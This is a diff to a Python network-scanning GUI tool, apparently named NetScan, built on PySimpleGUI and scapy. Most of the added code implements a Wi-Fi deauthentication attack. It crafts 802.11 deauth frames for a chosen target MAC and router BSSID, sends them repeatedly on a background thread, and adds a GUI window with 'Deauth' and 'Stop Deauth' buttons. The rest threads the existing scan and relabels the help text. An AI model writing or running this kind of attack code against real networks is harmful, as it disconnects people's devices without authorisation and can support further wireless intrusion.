@@ -2,16 +2,47 @@
 import PySimpleGUI as sg
 from scapy.all import *
 import scapy.all as scapy
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 from manuf import manuf
 import datetime
 import socket
+import threading
 
 # Varibles
 hostname = conf.route.route("0.0.0.0")[2]
 show_short_oui = True
 now = datetime.datetime.now()
+stop_deauth_event = threading.Event()
+deauth_thread = None
 
 # Network stuff
+def deauth_function(target_mac, bssid, count=1):
+    global stop_deauth_event
+
+    stop_deauth_event.clear()  # Clears the event flag
+
+    while not stop_deauth_event.is_set():
+        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
+        for _ in range(count):
+            scapy.send(deauth_packet, verbose=False)
+        
+        time.sleep(10)
+        print("Deauthed for 10 Seconds, repeating...")
+
+def start_deauth(target_mac, bssid, count=1):
+    global deauth_thread
+
+    # Checks if there is an existing deauth thread, and if yes, stops it before starting a new one
+    if deauth_thread and deauth_thread.is_alive():
+        stop_deauth_thread()
+
+    deauth_thread = threading.Thread(target=deauth_function, args=(target_mac, bssid, count))
+    deauth_thread.start()
+
+def stop_deauth_thread():
+    global stop_deauth_event
+    stop_deauth_event.set()
+    print("Stopped Deauth.")
 
 def get_device_type(mac_address):
     global show_short_oui
@@ -75,13 +106,16 @@ def scan(ip):
     print("\nDone\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------")
     print("Finished at " + str(now))
 
+def scan_thread(ip):
+    scanning_thread = threading.Thread(target=scan, args=(ip,))
+    scanning_thread.start()
 
 # GUI
 sg.theme('Topanga') 
 
 def help():
     layout2 = [
-        [sg.Text('Known issues:')],
+        [sg.Text('FAQ:')],
         [sg.Text('    1. No results? I could be wrong but I believe this is occurs when WinPcap is used. This is not an issue with NetScan, but rather WinPcap.')],
         [sg.Text('       This can also occur because the IP Range you entered was Invalid. 24 is set by default which should work just fine.')],
         [sg.Text('')],
@@ -100,6 +134,28 @@ def help():
             break
     help_window.Close()
 
+def deauth_window():
+    layout3 = [
+        [sg.Text("Target MAC:                    Router MAC:")],
+        [sg.Input(key="-TARGET-", size=(20, 1)), sg.Input(key="-ROUTER-", size=(20, 1))],
+        [sg.Output(size=(39, 25), key="-OUT-")],
+        [sg.Button("Deauth", key="-DEAUTH-"), sg.Button("Stop Deauth", key="-STOP-")]
+    ]
+
+    deauth_win = sg.Window("Deauth Window", layout3)
+
+    while True:
+        event, values = deauth_win.Read()
+
+        if event in (None, "Exit"):
+            break
+        elif event in '-DEAUTH-':
+            start_deauth(target_mac=values["-TARGET-"], bssid=values["-ROUTER-"])
+            print("Deauthing " + values["-TARGET-"] + ", this lasts about 10 seconds so it will be looped every 10 seconds.\n--------------------------------------------------------------------")
+        elif event in "-STOP-":
+            stop_deauth_thread()
+
+    deauth_win.Close()
 
 def main():
     global show_short_oui
@@ -107,22 +163,24 @@ def main():
         [sg.Text('Router IP'), sg.Text("                     IP Range"), sg.Checkbox("Short OUIs", key='OUI', default=False)],
         [sg.Input(hostname, key='_IN_', size=(20,1)), sg.Input("24", key="-IN-", size=(10,1))],
         [sg.Output(size=(95,25), key="-OUT-")],
-        [sg.Button('Scan Network'), sg.Button('Exit'), sg.Button('Help'), sg.Button("Clear output", key="-CLEAR-")]
+        [sg.Button('Scan Network'), sg.Button('Deauth a device'), sg.Button('Help'), sg.Button("Clear output", key="-CLEAR-"), sg.Button('Exit')]
     ]
 
     window = sg.Window('NetScan', layout)
 
     while True:
         event, values = window.Read()
-        if event in 'Exit':
+        if event in (None, "Exit"):
             break
-        if event in 'Help':
+        elif event in 'Help':
             help()
-        if event in "-CLEAR-":
+        elif event in "-CLEAR-":
             window.FindElement("-OUT-").Update('')
+        elif event in 'Deauth a device':
+            deauth_window()
         elif event == 'Scan Network':
             show_short_oui = values['OUI']
-            scan(ip=values['_IN_'] + "/" + values['-IN-'])
+            scan_thread(ip=(values['_IN_'] + "/" + values['-IN-']))
 
     window.Close()
 
